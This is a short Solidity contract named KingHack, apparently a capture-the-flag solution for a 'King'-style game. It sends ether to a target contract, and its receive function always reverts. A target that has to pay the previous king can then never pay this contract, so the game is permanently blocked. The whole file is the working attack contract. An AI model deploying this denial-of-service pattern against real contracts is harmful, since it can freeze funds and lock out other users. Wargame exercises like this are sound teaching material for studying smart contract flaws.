// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract KingHack {

    function hack(address _target) external payable {
        (bool success, ) = payable(_target).call{value: msg.value}("");
    }

    receive() external payable {
        require(false, "Intentionally Fail");
    }
}